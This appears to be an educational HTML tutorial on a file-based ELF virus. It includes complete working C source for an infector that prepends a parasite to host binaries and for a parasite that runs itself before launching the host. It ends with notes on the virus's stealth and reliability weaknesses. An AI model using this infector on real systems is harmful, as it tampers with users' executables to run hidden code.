@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+  <meta name="generator" content="Madoko, version 1.1.6" />
+  <meta name="viewport" content="initial-scale=1.0" />
+  <title>File-Based ELF Infector</title>
+  <style type="text/css"  class="link">
+  /*# sourceURL=madoko.css */
+  
+  .madoko .toc>.tocblock .tocblock .tocblock {
+    margin-left: 2.25em;
+  }
+  .madoko .toc>.tocblock .tocblock {
+    margin-left: 1.5em;
+  }
+  .madoko .toc-contents>.tocblock>.tocitem {
+    font-weight: bold;
+  }
+  .madoko .toc {
+    margin-top: 1em;
+  }
+  .madoko p.para-continue {
+    margin-bottom: 0pt;
+  }
+  .madoko .para-block+p {
+    margin-top: 0pt;
+  }
+  .madoko ul.para-block, .madoko ol.para-block {
+    margin-top: 0pt;
+    margin-bottom: 0pt;
+  }
+  .madoko ul.para-end, .madoko ol.para-end {
+    margin-bottom: 1em;
+  }
+  .madoko dl {
+    margin-left: 0em;
+  }
+  .madoko blockquote {
+    font-style: italic;
+  }
+  .madoko a.localref {
+    text-decoration: none;
+  }
+  .madoko a.localref:hover {
+    text-decoration: underline;
+  }
+  .madoko .footnotes {
+    font-size: smaller;
+    margin-top: 2em;
+  }
+  .madoko .footnotes hr {
+    width: 50%;
+    text-align: left;
+  }
+  .madoko .footnote { 
+    margin-left: 1em;
+  }
+  .madoko .footnote-before {
+    margin-left: -1em;
+    width: 1em;
+    display: inline-block;
+  }
+  .madoko .align-center, .madoko .align-center>p {
+    text-align: center !important;
+  }
+  .madoko .align-center pre {
+    text-align: left;
+  }
+  .madoko .align-center>* {
+    margin-left: auto !important;
+    margin-right: auto !important;
+  }
+  .madoko .align-left, .madoko .align-left>p {
+    text-align: left !important;
+  }
+  .madoko .align-left>* {
+    margin-left: 0pt !important;
+    margin-right: auto !important;
+  }
+  .madoko .align-right, .madoko .align-right>p {
+    text-align: right !important;
+  }
+  .madoko .align-right>* {
+    margin-left: auto !important;
+    margin-right: 0pt !important;
+  }
+  .madoko .align-center>table,
+  .madoko .align-left>table,
+  .madoko .align-right>table {
+    text-align: left !important;
+  }
+  .madoko .equation-before {
+    float: right;
+  }
+  .madoko .bibitem {
+    font-size: smaller;
+  }
+  .madoko .bibsearch {
+    font-size: x-small;
+    text-decoration:none;
+    color: black;
+    font-family: "Segoe UI Symbol", Symbola, serif;
+  }
+  .madoko .block, .madoko .figure, .madoko .bibitem, .madoko .equation, .madoko div.math {
+    margin-top: 1ex;
+    margin-bottom: 1ex;
+  }
+  .madoko .figure {
+    padding: 0.5em;
+    margin-left: 0pt;
+    margin-right: 0pt;
+  }
+  .madoko .hidden {
+    display: none;
+  }
+  .madoko .invisible {
+    visibility: hidden;
+  }
+  .madoko.preview .invisible {
+    visibility: visible;
+    opacity: 0.5;
+  }
+  .madoko code.code, .madoko span.code {
+    white-space: pre-wrap;
+  }
+  .madoko hr, hr.madoko {
+    border: none;
+    border-bottom: black solid 1px;
+    margin-bottom: 0.5ex;
+  }
+  .madoko .framed>*:first-child {
+    margin-top: 0pt;
+  }
+  .madoko .framed>*:last-child {
+    margin-bottom: 0pt;
+  }
+  .madoko ul.list-style-type-dash {
+      list-style-type: none !important;
+  }
+  .madoko ul.list-style-type-dash > li:before {
+      content: "\2013"; 
+      position: absolute;
+      margin-left: -1em; 
+  }
+  .madoko table.madoko {
+    border-collapse: collapse;
+  }
+  .madoko td, .madoko th {
+    padding: 0ex 0.5ex;
+    margin: 0pt;
+    vertical-align: top;
+  }
+  .madoko .cell-border-left {
+    border-left: 1px solid black;
+  }
+  .madoko .cell-border-right {
+    border-right: 1px solid black;
+  }
+  .madoko thead>tr:first-child>.cell-line,
+  .madoko tbody:first-child>tr:first-child>.cell-line {
+    border-top: 1px solid black;
+    border-bottom: none;
+  }
+  .madoko .cell-line, .madoko .cell-double-line {
+    border-bottom: 1px solid black;
+    border-top: none;
+  }
+  .madoko .cell-double-line {
+    border-top: 1px solid black;
+    padding-top: 1.5px !important;
+  }
+  .madoko .input-mathpre .MathJax_Display {
+    text-align: left !important;
+  }
+  .madoko div.input-mathpre {
+    text-align: left;
+    margin-top: 1.5ex;
+    margin-bottom: 1ex;
+  }
+  .madoko .math-rendering {
+    text-align: left;
+    white-space: pre;
+    color: gray;
+  }
+  .madoko .mathdisplay {
+    text-align: center;
+  }
+  .madoko .pretty table {
+    border-collapse: collapse;
+  }
+  .madoko .pretty td {
+    padding: 0em;
+  }
+  .madoko .pretty td.empty {
+    min-width: 1.5ex;
+  }
+  .madoko .pretty td.expander {
+    width: 100em;
+  }
+  body.madoko, .madoko .serif {
+    font-family: Cambria,"Times New Roman","Liberation Serif","Times",serif;
+  }
+  .madoko .sans-serif {
+    font-family: "Calibri", "Optima", sans-serif;
+  }
+  .madoko .symbol {
+    font-family: "Segoe UI Symbol", Symbola, serif;
+  }
+  body.madoko {  
+    -webkit-text-size-adjust: 100%;       
+    text-rendering: optimizeLegibility;
+  }
+  body.madoko {
+    max-width: 88ex; 
+    margin: 1em auto;
+    padding: 0em 2em;  
+  }
+  body.preview.madoko {
+    padding: 0em 1em;
+  }
+  .madoko p {
+    text-align: justify;
+  }
+  .madoko h1, .madoko h2, .madoko h3, .madoko h4 { 
+    margin-top: 1.22em; 
+    margin-bottom: 1ex;
+  }
+  .madoko h1+p, .madoko h2+p, .madoko h3+p, .madoko h4+p, .madoko h5+p  { 
+    margin-top: 1ex;    
+  }
+  .madoko h5, .madoko h6 { 
+    margin-top: 1ex;
+    font-size: 1em;
+  }
+  .madoko h5 { 
+    margin-bottom: 0.5ex;
+  }
+  .madoko h5 + p {
+    margin-top: 0.5ex;
+  }
+  .madoko h6 { 
+    margin-bottom: 0pt;
+  }
+  .madoko h6 + p {
+    margin-top: 0pt;
+  }
+  .madoko pre, .madoko code, .madoko kbd, .madoko samp, .madoko tt, 
+  .madoko .monospace, .madoko .token-indent, .madoko .reveal pre, .madoko .reveal code, .madoko .email {
+    font-family: Consolas,"Andale Mono WT","Andale Mono",Lucida Console,Monaco,monospace,monospace;
+    font-size: 0.85em;
+  }
+  .madoko pre code, .madoko .token-indent {
+    font-size: 0.95em;
+  }
+  .madoko pre code {
+    font-family: inherit !important;
+  }
+  .madoko ol.linenums li {
+    background-color: white;
+    list-style-type: decimal;
+  }
+  .madoko .remote {
+    background-color: #F0FFF0;
+  }
+  .madoko .remote + * {
+    margin-top: 0pt;
+  }
+  @media print {
+    body.madoko {
+      font-size: 10pt;
+    }
+    @page {
+      margin: 1in 1.5in;
+    }
+  }
+  @media only screen and (max-device-width:1024px) {
+    body.madoko {
+      padding: 0em 0.5em;    
+    }
+    .madoko li {
+      text-align: left;
+    }
+  }
+  
+    </style>
+  
+  </head>
+<body class="madoko">
+
+<div class="body madoko" style="line-adjust:0">
+
+<div class="titleblock align-center para-block" style="text-align:center;line-adjust:0">
+<div class="titleheader align-center" style="text-align:center;line-adjust:0">
+<div class="title para-block" style="font-size:xx-large;font-weight:bold;margin-bottom:0.5ex;line-adjust:0">File-Based ELF Infector</div></div></div><span data-line=""></span>
+<nav class="toc toc-contents"><h2 id="sec-contents" class="clearnum h1 heading-contents" data-heading-depth="1" style="display:block">Contents</h2>
+<div class="tocblock tocblock1">
+<div class="tocitem tocitem1" data-toc-target-elem="h1" data-toc-target="sec-introduction" data-toc-depth="1" data-toc-line="[1]{.heading-label}.&#8194;Introduction" style="toctarget:sec-introduction"><a href="#sec-introduction" class="localref"><span class="heading-label">1</span>.&#8194;Introduction</a></div>
+<div class="tocitem tocitem1" data-toc-target-elem="h1" data-toc-target="sec-infector" data-toc-depth="1" data-toc-line="[2]{.heading-label}.&#8194;Infector" style="toctarget:sec-infector"><a href="#sec-infector" class="localref"><span class="heading-label">2</span>.&#8194;Infector</a></div>
+<div class="tocitem tocitem1" data-toc-target-elem="h1" data-toc-target="sec-parasite" data-toc-depth="1" data-toc-line="[3]{.heading-label}.&#8194;Parasite" style="toctarget:sec-parasite"><a href="#sec-parasite" class="localref"><span class="heading-label">3</span>.&#8194;Parasite</a></div>
+<div class="tocitem tocitem1" data-toc-target-elem="h1" data-toc-target="sec-weaknesses" data-toc-depth="1" data-toc-line="[4]{.heading-label}.&#8194;Weaknesses" style="toctarget:sec-weaknesses"><a href="#sec-weaknesses" class="localref"><span class="heading-label">4</span>.&#8194;Weaknesses</a></div></div></nav><h2 id="sec-introduction" class="h1" data-heading-depth="1" style="display:block"><span class="heading-before"><span class="heading-label">1</span>.&#8194;</span>Introduction</h2>
+<p class="p noindent">Here is some vocabulary for discussing Unix Infections:
+</p>
+<ul class="ul list-dash compact">
+<li class="li ul-li list-dash-li compact-li"><strong class="strong-star2">Host</strong>: the file that is infected (or going to be infected). This file is often a binary file, meaning it has already been compiled.
+</li>
+<li class="li ul-li list-dash-li compact-li"><strong class="strong-star2">Parasite Code</strong>: a piece of code that we want to run. This parasite usually does things like spreading itself by infecting other files or stealing some type of data from the computer its running on.
+</li>
+<li class="li ul-li list-dash-li compact-li"><strong class="strong-star2">Infection Method</strong>: the technique by which we set up our parasite to run. Different infection methods have different pros and cons. If we are using the analogy of a human sickness, the infection method would be the method by which someone gets sick (not the sickness itself).
+</li></ul>
+
+<p class="p noindent">In his paper on Unix Viruses, Silvio Cesare introduces an extremely simple infection method: <strong class="strong-star2">appending the host executable to the parasite executable</strong>. I think it is best to explain this as an example. I wrote a simple <code class="code code1">Hello World</code> C program to be our host.
+</p>
+<pre class="para-block pre-fenced pre-fenced3" style="display:block"><code>$ vim hello.c
+
+$ gcc hello.c -o hello.out
+
+$ ./hello.out
+Hello World</code></pre>
+<p class="p noindent para-continued">Now we want to preserve the behavior of <code class="code code1">hello.out</code> while also executing our parasite code on the side. For this example, I am going to make the parasite code print to <code class="code code1">stdout</code> so that we can see that it indeed is running. But in real life, this parasite code is usually doing something more malicous like spreading itself, delelting files, etc. In the end, I want this to happen:
+</p>
+<pre class="para-block pre-fenced pre-fenced3" style="display:block"><code>$ ./hello.out
+Hello World
+
+$ ./infect.out hello.out parasite.out    
+     # ^^ infect hello.out with our parasite code (parasite.out)
+
+$ ./hello.out
+Parasite code is running!
+Hello World</code></pre>
+<p class="p noindent para-continued">In order to make this work we are going to have to write two files: <code class="code code1">infect.c</code> (the infector) and <code class="code code1">parasite.c</code> (the parasite). Their jobs are as follows:
+</p>
+<ul class="ul list-dash compact">
+<li class="li ul-li list-dash-li compact-li"><strong class="strong-star2">Infector:</strong> append the host executable to the parasite executable and overwrite the original host with this new combined executable.
+</li>
+<li class="li ul-li list-dash-li compact-li"><strong class="strong-star2">Parasite:</strong> needs the ability to first run itself, then run the host executable that is appended to it.
+</li></ul>
+<h2 id="sec-infector" class="h1" data-heading-depth="1" style="display:block"><span class="heading-before"><span class="heading-label">2</span>.&#8194;</span>Infector</h2>
+<p class="p noindent">The infector is easier to write so let&#39;s tackle that first. Here is a step by step algorithm with some C specifics for our infector:
+</p>
+<ol class="ol compact">
+<li class="li ol-li compact-li">Copy the host executable into memory
+</li>
+<li class="li ol-li compact-li">Copy the parasite executable into memory
+</li>
+<li class="li ol-li compact-li">Open a file pointer to the host executable in overwrite mode.
+</li>
+<li class="li ol-li compact-li">Write the parasite executable first, followed by the host executable.
+</li>
+<li class="li ol-li compact-li">Close the file and exit.
+</li></ol>
+
+<p class="p noindent">Here is some C code for the infector:
+</p>
+<pre class="para-block pre-fenced pre-fenced3 language-cpp lang-cpp cpp colorized" style="display:block"><code><span style="color:navy">#</span><span style="color:navy">include</span><span style="color:maroon"> &lt;stdio.h&gt;</span>
+<span style="color:navy">#</span><span style="color:navy">include</span><span style="color:maroon"> &lt;stdlib.h&gt;</span>
+<span style="color:navy">#</span><span style="color:navy">include</span><span style="color:maroon"> &lt;sys/mman.h&gt;</span>
+
+<span style="color:teal">int</span> main(<span style="color:teal">int</span> argc, <span style="color:teal">char</span> **argv) {
+    <span style="color:blue">if</span> (argc != <span class="constant" style="color:purple">3</span>) {
+        printf(<span style="color:maroon">&quot;</span><span style="color:maroon">Usage: ./infect [host] [parasite]</span><span style="color:gray">\n</span><span style="color:maroon">&quot;</span>);
+        exit(<span class="constant" style="color:purple">0</span>);
+    }
+
+    <span style="color:teal">char</span> *host = argv[<span class="constant" style="color:purple">1</span>];
+    <span style="color:teal">char</span> *parasite = argv[<span class="constant" style="color:purple">2</span>];
+
+
+    <span style="color:darkgreen">/*</span><span style="color:darkgreen"> Open the host file </span><span style="color:darkgreen">*/</span>
+    <span style="color:teal">FILE</span> *host_fp = fopen(host, <span style="color:maroon">&quot;</span><span style="color:maroon">r+</span><span style="color:maroon">&quot;</span>);
+    <span style="color:blue">if</span> (host_fp == <span style="color:teal">NULL</span>) {
+        perror(<span style="color:maroon">&quot;</span><span style="color:maroon">Could not open the host file</span><span style="color:maroon">&quot;</span>);
+        exit(<span class="constant" style="color:purple">1</span>);
+    }
+
+    <span style="color:darkgreen">/*</span><span style="color:darkgreen"> Get the size of the host file </span><span style="color:darkgreen">*/</span>
+    fseek(host_fp, <span class="constant" style="color:purple">0L</span>, <span style="color:teal">SEEK_END</span>);
+    <span style="color:teal">int</span> host_size = ftell(host_fp);
+    fseek(host_fp, <span class="constant" style="color:purple">0L</span>, <span style="color:teal">SEEK_SET</span>);
+
+    <span style="color:darkgreen">/*</span><span style="color:darkgreen"> Allocate a buffer for the host file </span><span style="color:darkgreen">*/</span>
+    <span style="color:teal">char</span> *host_buffer = calloc(host_size, <span style="color:blue">sizeof</span>(<span style="color:teal">char</span>));
+    <span style="color:blue">if</span> (host_buffer == <span style="color:teal">NULL</span>) {
+        perror(<span style="color:maroon">&quot;</span><span style="color:maroon">calloc</span><span style="color:maroon">&quot;</span>);
+        exit(<span class="constant" style="color:purple">1</span>);
+    }
+
+    <span style="color:darkgreen">/*</span><span style="color:darkgreen"> Copy the host file into the buffer </span><span style="color:darkgreen">*/</span>
+    fread(host_buffer, <span style="color:blue">sizeof</span>(<span style="color:teal">char</span>), host_size, host_fp);
+
+
+    <span style="color:darkgreen">/*</span><span style="color:darkgreen"> Same operations for the parasite file </span><span style="color:darkgreen">*/</span>
+    <span style="color:teal">FILE</span> *parasite_fp = fopen(parasite, <span style="color:maroon">&quot;</span><span style="color:maroon">r</span><span style="color:maroon">&quot;</span>);
+    <span style="color:blue">if</span> (parasite_fp == <span style="color:teal">NULL</span>) {
+        perror(<span style="color:maroon">&quot;</span><span style="color:maroon">Could not open parasite file</span><span style="color:maroon">&quot;</span>);
+        exit(<span class="constant" style="color:purple">1</span>);
+    }
+
+    fseek(parasite_fp, <span class="constant" style="color:purple">0L</span>, <span style="color:teal">SEEK_END</span>);
+    <span style="color:teal">int</span> parasite_size = ftell(parasite_fp);
+    fseek(parasite_fp, <span class="constant" style="color:purple">0L</span>, <span style="color:teal">SEEK_SET</span>);
+    
+    <span style="color:teal">char</span> *parasite_buffer = calloc(parasite_size, <span style="color:blue">sizeof</span>(<span style="color:teal">char</span>));
+    <span style="color:blue">if</span> (parasite_buffer == <span style="color:teal">NULL</span>) {
+        perror(<span style="color:maroon">&quot;</span><span style="color:maroon">calloc</span><span style="color:maroon">&quot;</span>);
+        exit(<span class="constant" style="color:purple">1</span>);
+    }
+
+    fread(parasite_buffer, <span style="color:blue">sizeof</span>(<span style="color:teal">char</span>), parasite_size, parasite_fp);
+    fclose(parasite_fp);
+
+    <span style="color:darkgreen">/*</span><span style="color:darkgreen"> Write the parasite and then the old host to the host file </span><span style="color:darkgreen">*/</span>
+    fseek(host_fp, <span class="constant" style="color:purple">0L</span>, <span style="color:teal">SEEK_SET</span>);
+    fwrite(parasite_buffer, <span style="color:blue">sizeof</span>(<span style="color:teal">char</span>), parasite_size, host_fp);
+    fwrite(host_buffer, <span style="color:blue">sizeof</span>(<span style="color:teal">char</span>), host_size, host_fp);
+
+    fclose(host_fp);
+    free(host_buffer);
+    free(parasite_buffer);
+    <span style="color:blue">return</span> <span class="constant" style="color:purple">0</span>;
+}</code></pre><h2 id="sec-parasite" class="h1" data-heading-depth="1" style="display:block"><span class="heading-before"><span class="heading-label">3</span>.&#8194;</span>Parasite</h2>
+<p class="p noindent">The parasite is a bit more difficult because it needs to first run itself and then determine where the host executable begins so that it can copy the host executable to a new file and execute that file. Here is the list of steps for our parasite:
+</p>
+<ol class="ol compact">
+<li class="li ol-li compact-li">Execute whatever parasite code we want. In this case we are printing &#8220;Parasite code is running!&#8221;
+</li>
+<li class="li ol-li compact-li">Figure out which executable we were spawned from and open it as a file.
+</li>
+<li class="li ol-li compact-li">Go to the end of the parasite executable (Which should also be the start of the host executable). For this task, the parasite needs to know how large it is.
+</li>
+<li class="li ol-li compact-li">Copy the rest of the file (host executable) into a new file.
+</li>
+<li class="li ol-li compact-li">Execute that new file.
+</li></ol>
+
+<p class="p noindent">Here is some C code for the parasite:
+</p>
+<pre class="para-block pre-fenced pre-fenced3 language-cpp lang-cpp cpp colorized" style="display:block"><code><span style="color:navy">#</span><span style="color:navy">include</span><span style="color:maroon"> &lt;stdio.h&gt;</span>
+<span style="color:navy">#</span><span style="color:navy">include</span><span style="color:maroon"> &lt;stdlib.h&gt;</span>
+<span style="color:navy">#</span><span style="color:navy">include</span><span style="color:maroon"> &lt;string.h&gt;</span>
+<span style="color:navy">#</span><span style="color:navy">include</span><span style="color:maroon"> &lt;unistd.h&gt;</span>
+<span style="color:navy">#</span><span style="color:navy">include</span><span style="color:maroon"> &lt;sys/stat.h&gt;</span>
+
+<span style="color:navy">#</span><span style="color:navy">define</span><span style="color:maroon"> PARASITE_SIZE 8824</span>
+
+<span style="color:teal">int</span> main(<span style="color:teal">int</span> argc, <span style="color:teal">char</span> **argv) {
+
+    <span style="color:darkgreen">/*</span><span style="color:darkgreen"> Execute parasite code </span><span style="color:darkgreen">*/</span>
+    printf(<span style="color:maroon">&quot;</span><span style="color:maroon">Parasite code is running!</span><span style="color:gray">\n</span><span style="color:maroon">&quot;</span>);
+
+    <span style="color:darkgreen">/*</span><span style="color:darkgreen"> Move to the beginning of the host executable </span><span style="color:darkgreen">*/</span>
+    <span style="color:teal">FILE</span> *fp = fopen(argv[<span class="constant" style="color:purple">0</span>], <span style="color:maroon">&quot;</span><span style="color:maroon">r</span><span style="color:maroon">&quot;</span>);
+    fseek(fp, <span class="constant" style="color:purple">0L</span>, <span style="color:teal">SEEK_END</span>);
+    <span style="color:teal">int</span> file_size = ftell(fp);
+
+    fseek(fp, <span style="color:teal">PARASITE_SIZE</span>, <span style="color:teal">SEEK_SET</span>);
+
+    <span style="color:darkgreen">/*</span><span style="color:darkgreen"> Read host executable into buffer </span><span style="color:darkgreen">*/</span>
+    <span style="color:teal">int</span> host_size = file_size - <span style="color:teal">PARASITE_SIZE</span>;
+    <span style="color:teal">char</span> *host_buffer = calloc(host_size, <span style="color:blue">sizeof</span>(<span style="color:teal">char</span>));
+    fread(host_buffer, <span style="color:blue">sizeof</span>(<span style="color:teal">char</span>), host_size, fp); 
+
+    <span style="color:darkgreen">/*</span><span style="color:darkgreen"> Write host executable into a temp file </span><span style="color:darkgreen">*/</span>
+    <span style="color:teal">FILE</span> *temp_fp = fopen(<span style="color:maroon">&quot;</span><span style="color:maroon">temp.out</span><span style="color:maroon">&quot;</span>, <span style="color:maroon">&quot;</span><span style="color:maroon">w</span><span style="color:maroon">&quot;</span>);
+    fwrite(host_buffer, <span style="color:blue">sizeof</span>(<span style="color:teal">char</span>), host_size, temp_fp);
+
+    <span style="color:darkgreen">/*</span><span style="color:darkgreen"> Clean up </span><span style="color:darkgreen">*/</span>
+    fclose(temp_fp);
+    fclose(fp);
+    free(host_buffer);
+
+    chmod(<span style="color:maroon">&quot;</span><span style="color:maroon">temp.out</span><span style="color:maroon">&quot;</span>, <span style="color:teal">S_IXOTH</span> | <span style="color:teal">S_IXGRP</span> | <span style="color:teal">S_IXUSR</span>);
+
+    <span style="color:darkgreen">/*</span><span style="color:darkgreen"> Execute the host executable </span><span style="color:darkgreen">*/</span>
+    <span style="color:teal">int</span> ret = execl(<span style="color:maroon">&quot;</span><span style="color:maroon">temp.out</span><span style="color:maroon">&quot;</span>, <span style="color:maroon">&quot;</span><span style="color:maroon">temp.out</span><span style="color:maroon">&quot;</span>, (<span style="color:teal">char</span> *) <span class="constant" style="color:purple">0</span>);
+    <span style="color:blue">if</span> (ret == -<span class="constant" style="color:purple">1</span>) {
+        perror(<span style="color:maroon">&quot;</span><span style="color:maroon">execl</span><span style="color:maroon">&quot;</span>);
+        exit(<span class="constant" style="color:purple">1</span>);
+    }
+
+    <span style="color:blue">return</span> <span class="constant" style="color:purple">0</span>;
+}</code></pre>
+<p class="p noindent para-continued">I have defined the parasite size as a macro. The quick and dirty way to figure out what this value should be is to compile the parasite and look at its size, then put the size in and recompile. This doesn&#39;t work in all situations but it works here because integers are represented as a fixed size. In this case, I compiled the parasite and used the <code class="code code1">ls -l</code> command to look at its size:
+</p>
+<pre class="para-block pre-fenced pre-fenced3" style="display:block"><code>-rwxrwxr-x 1 aaron aaron  8824 Jan  6 17:33  parasite.out</code></pre>
+<p class="p noindent para-continued">As you can see, the size is <code class="code code1">8824</code> bytes, which is properly reflected in my source code. Once we have everything compiled we get our desired behavior:
+</p>
+<pre class="para-block pre-fenced pre-fenced3" style="display:block"><code>$ make
+gcc hello.c -o hello.out
+gcc infect.c -o infect.out
+gcc parasite.c -o parasite.out
+
+$ ./hello.out
+Hello World
+
+$ ./infect.out hello.out parasite.out
+
+$ ./hello.out
+Parasite code is running!
+Hello World</code></pre>
+<p class="p noindent para-continued">This virus definitely isn&#39;t finished. There are several simple improvements that can be made such as waiting for the child process to finish running and then deleting the file afterwards. We could also add machinery to check if a binary has already been infected. I opted for none of these features to keep the code as straightforward as possible, but they are good exercises if you are inclined.
+</p><h2 id="sec-weaknesses" class="h1" data-heading-depth="1" style="display:block"><span class="heading-before"><span class="heading-label">4</span>.&#8194;</span>Weaknesses</h2>
+<p class="p noindent">The virus has a few main weaknesses:
+</p>
+<ul class="ul list-dash compact">
+<li class="li ul-li list-dash-li compact-li"><strong class="strong-star2">Strip Safety</strong>: Since, in the eyes of the OS, the appended original executable isn&#39;t neccessary to run, it will be removed if we run the <code class="code code1">strip</code> command. Technically, this behavior is acutally because the appended executable isn&#39;t accounted for by any program headers but we will talk more ELF format specifics in the following articles. The virus will break if an infected executable is stripped.
+</li>
+<li class="li ul-li list-dash-li compact-li"><strong class="strong-star2">Stealthiness</strong>: Our virus isn&#39;t very stealthy. For one, it leaves temp files around in its current form. And although this could easily be fixed, we would still be writing and deleting files, meaning that disk forensics will probably be able to recover these executables. Also, the size of the original executable is noticably inflated by the parasite executable upon infection. A good binary analyst will notice this right away.
+</li>
+<li class="li ul-li list-dash-li compact-li"><strong class="strong-star2">Reliability</strong>: Our virus doesn&#39;t always ensure correct execution of the host executable. For example, consider the case where the host executable takes a number of command line arguments. As the virus exists now, there is nothing in place to pass command line arguments to the host executable from the parasite. This means that the host executes every time as if it was passed no command line arguments (which is obviously not correct behavior). This will probably puzzle whoever is executing the infected binary and cause them to recompile, killing our virus.
+</li></ul><span data-line=""></span></div>
+</body>
+
+</html>
